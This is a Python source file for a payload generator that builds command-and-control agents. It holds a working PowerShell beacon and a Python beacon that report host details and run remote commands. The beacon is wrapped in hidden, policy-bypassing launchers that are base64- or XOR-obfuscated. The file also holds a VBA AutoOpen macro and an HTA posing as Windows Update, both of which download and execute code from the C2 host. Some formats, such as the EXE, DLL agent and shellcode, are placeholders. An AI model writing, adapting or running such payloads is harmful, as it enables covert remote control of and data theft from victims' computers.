#!/usr/bin/env python3
"""
Payload Generator
Features: Multiple formats (EXE, DLL, PowerShell, Shellcode, Python)
"""

import os
import sys
import base64
import hashlib
import json
import struct
import subprocess
from typing import Optional, Dict, List
from pathlib import Path
import tempfile

class PayloadGenerator:
    """Generate payloads in multiple formats"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.c2_server = self.config.get('c2_server', '192.168.1.100')
        self.c2_port = self.config.get('c2_port', 8080)
        self.protocol = self.config.get('protocol', 'http')
        self.sleep_time = self.config.get('sleep_time', 10)
        self.jitter = self.config.get('jitter', 0.3)
        self.encryption = self.config.get('encryption', 'aes')
        self.obfuscation = self.config.get('obfuscation', 'base64')
    
    def generate_powershell(self) -> str:
        """Generate PowerShell payload"""
        
        # Base agent script
        script = f"""
# C2 Agent PowerShell Payload
$C2Server = "http://{self.c2_server}:{self.c2_port}"
$SleepTime = {self.sleep_time}
$Jitter = {self.jitter}

function Get-BeaconData {{
    $info = @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os_type = (Get-WmiObject Win32_OperatingSystem).Caption
        pid = $pid
        is_admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    }}
    return $info
}}

function Send-Beacon {{
    try {{
        $data = Get-BeaconData | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$C2Server/beacon" -Method Post -Body $data -ContentType "application/json"
        return $response
    }} catch {{
        return $null
    }}
}}

function Execute-Command {{
    param($Command)
    try {{
        $result = & $Command 2>&1
        return $result | Out-String
    }} catch {{
        return "Error: $($_.Exception.Message)"
    }}
}}

function Process-Commands {{
    param($Commands)
    foreach ($cmd in $Commands) {{
        $output = Execute-Command -Command $cmd
        # Send result back
        try {{
            $result = @{{ output = $output }} | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2Server/result" -Method Post -Body $result -ContentType "application/json"
        }} catch {{}}
    }}
}}

# Main loop
while ($true) {{
    $jitter = Get-Random -Minimum -$($SleepTime * $Jitter) -Maximum $($SleepTime * $Jitter)
    Start-Sleep -Seconds ($SleepTime + $jitter)
    
    $response = Send-Beacon
    if ($response -and $response.commands) {{
        Process-Commands -Commands $response.commands
    }}
}}
"""
        
        if self.obfuscation == "base64":
            # Base64 encode the script
            encoded = base64.b64encode(script.encode()).decode()
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
        
        elif self.obfuscation == "xor":
            # XOR obfuscation
            key = 0xAA
            encoded = ''.join([chr(ord(c) ^ key) for c in script])
            return f"powershell -c $x='{encoded}';$k=0xAA;$x-split''|%{{[char]($_[0]-bxor$k)}}"
        
        else:
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -c \"{script}\""
    
    def generate_python(self, format_type: str = "standalone") -> str:
        """Generate Python payload"""
        
        script = f'''
#!/usr/bin/env python3
import socket
import json
import time
import subprocess
import os
import sys
import random
import platform

C2_SERVER = "{self.c2_server}"
C2_PORT = {self.c2_port}
SLEEP_TIME = {self.sleep_time}
JITTER = {self.jitter}

class C2Client:
    def __init__(self):
        self.beacon_id = None
    
    def get_system_info(self):
        return {{
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "Unknown")),
            "os_type": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "pid": os.getpid(),
            "is_admin": os.geteuid() == 0 if hasattr(os, "geteuid") else False
        }}
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {{str(e)}}"
    
    def send_beacon(self):
        try:
            data = self.get_system_info()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_SERVER, C2_PORT))
            sock.send(json.dumps(data).encode())
            
            response = sock.recv(4096).decode()
            sock.close()
            
            if response:
                return json.loads(response)
            return None
        except Exception as e:
            return None
    
    def run(self):
        print("[+] C2 Agent started")
        
        while True:
            jitter = random.uniform(-SLEEP_TIME * JITTER, SLEEP_TIME * JITTER)
            time.sleep(SLEEP_TIME + jitter)
            
            try:
                response = self.send_beacon()
                if response and "commands" in response:
                    for cmd in response["commands"]:
                        output = self.execute_command(cmd)
                        # Send result back (implement as needed)
            except Exception as e:
                pass

if __name__ == "__main__":
    client = C2Client()
    client.run()
'''
        
        if format_type == "standalone":
            return script
        elif format_type == "base64":
            return base64.b64encode(script.encode()).decode()
        else:
            return script
    
    def generate_custom(self, format_type: str = "exe") -> bytes:
        """Generate custom format payload"""
        
        if format_type == "exe":
            return self.generate_windows_exe()
        elif format_type == "dll":
            return self.generate_windows_dll()
        elif format_type == "shellcode":
            return self.generate_shellcode()
        elif format_type == "macro":
            return self.generate_macro()
        elif format_type == "hta":
            return self.generate_hta()
        else:
            return self.generate_windows_exe()
    
    def generate_windows_exe(self) -> bytes:
        """Generate Windows EXE payload"""
        # This would compile a Go/C++ executable
        # For demonstration, we'll create a placeholder
        
        # In a real implementation, you would:
        # 1. Write agent code to temp file
        # 2. Compile with MinGW or Visual Studio
        # 3. Return the resulting binary
        
        # Return a simple placeholder
        return b"Windows EXE Payload (placeholder)"
    
    def generate_windows_dll(self) -> bytes:
        """Generate Windows DLL payload"""
        dll_code = f'''
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
            // Call C2 server
            // Create thread to avoid blocking
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartAgent, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

DWORD WINAPI StartAgent(LPVOID lpParam) {{
    // Agent code here
    // Would connect to C2 server
    return 0;
}}
'''
        return dll_code.encode()
    
    def generate_shellcode(self) -> bytes:
        """Generate shellcode payload"""
        # Generate shellcode for injection
        # This would use msfvenom or custom shellcode generator
        
        # Placeholder
        return b"\x90\x90\x90\x90"  # NOP sled placeholder
    
    def generate_macro(self) -> str:
        """Generate VBA macro payload"""
        macro = f'''
Sub AutoOpen()
    Dim url As String
    Dim obj As Object
    
    url = "http://{self.c2_server}:{self.c2_port}/payload"
    
    Set obj = CreateObject("MSXML2.XMLHTTP")
    obj.Open "GET", url, False
    obj.Send
    
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -c " & obj.responseText, 0, False
End Sub
'''
        return macro
    
    def generate_hta(self) -> str:
        """Generate HTA payload"""
        hta = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Update</title>
    <HTA:APPLICATION ID="oWindowsUpdate" APPLICATIONNAME="WindowsUpdate" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"/>
</head>
<body>
    <script language="VBScript">
        CreateObject("WScript.Shell").Run "powershell -c ""Invoke-WebRequest -Uri 'http://{self.c2_server}:{self.c2_port}/payload' -OutFile $env:TEMP\payload.ps1; & $env:TEMP\payload.ps1""", 0, False
    </script>
</body>
</html>
'''
        return hta
    
    def generate_staged(self) -> Dict:
        """Generate staged payload"""
        return {
            'stage1': "https://raw.githubusercontent.com/.../stager.ps1",
            'stage2': "https://raw.githubusercontent.com/.../stage2.dll",
            'config': {
                'c2_server': self.c2_server,
                'c2_port': self.c2_port,
                'encryption': self.encryption
            }
        }
    
    def generate_stageless(self) -> Dict:
        """Generate stageless payload"""
        return {
            'payload': self.generate_powershell(),
            'type': 'stageless',
            'c2_server': self.c2_server,
            'c2_port': self.c2_port,
            'sleep_time': self.sleep_time,
            'jitter': self.jitter
        }
    
    def encode_payload(self, payload: bytes, method: str = "base64") -> bytes:
        """Encode/obfuscate payload"""
        if method == "base64":
            return base64.b64encode(payload)
        elif method == "xor":
            key = 0xAA
            return bytes([b ^ key for b in payload])
        elif method == "aes":
            # AES encryption
            try:
                from cryptography.fernet import Fernet
                key = Fernet.generate_key()
                cipher = Fernet(key)
                encrypted = cipher.encrypt(payload)
                return encrypted + b"||" + key
            except:
                return payload
        else:
            return payload
    
    def get_payload_info(self) -> Dict:
        """Get information about generated payload"""
        return {
            'format': self.config.get('format', 'powershell'),
            'size': 0,  # Would calculate actual size
            'c2_server': self.c2_server,
            'c2_port': self.c2_port,
            'protocol': self.protocol,
            'encryption': self.encryption,
            'obfuscation': self.obfuscation
        }
